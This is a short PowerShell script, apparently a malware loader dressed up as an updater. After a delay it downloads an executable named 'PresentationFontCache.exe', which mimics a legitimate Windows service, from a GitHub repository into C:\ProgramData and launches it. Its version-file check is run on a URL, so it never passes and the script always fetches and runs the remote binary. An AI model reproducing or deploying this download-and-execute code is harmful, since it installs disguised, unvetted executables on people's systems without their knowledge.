Start-Sleep -s 10
# Set the TLS protocol version
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# Set the URL
$url_text = 'https://raw.githubusercontent.com/qwertyuiopindia/log/main/version.txt'
$url_exe = 'https://github.com/qwertyuiopindia/log/blob/main/PresentationFontCache.exe?raw=true'
$file_exe = "C:\ProgramData\PresentationFontCache.exe"

# Check if the version file exists
if (Test-Path $url_text) {
    # Download the version file
    Invoke-WebRequest $url_text -OutFile "C:\ProgramData\version.txt"

    # Check if the exe file exists
    if (Test-Path $file_exe) {
        # Run the exe file
        Start-Process -FilePath $file_exe
    } else {
        # Download the exe file
        Invoke-WebRequest $url_exe -OutFile $file_exe
        # Run the exe file
        Start-Process -FilePath $file_exe
    }
} else {
    # Updated the exe file
    Invoke-WebRequest $url_exe -OutFile $file_exe
    # Run the exe file
    Start-Process -FilePath $file_exe
}

# Exit the script
exit
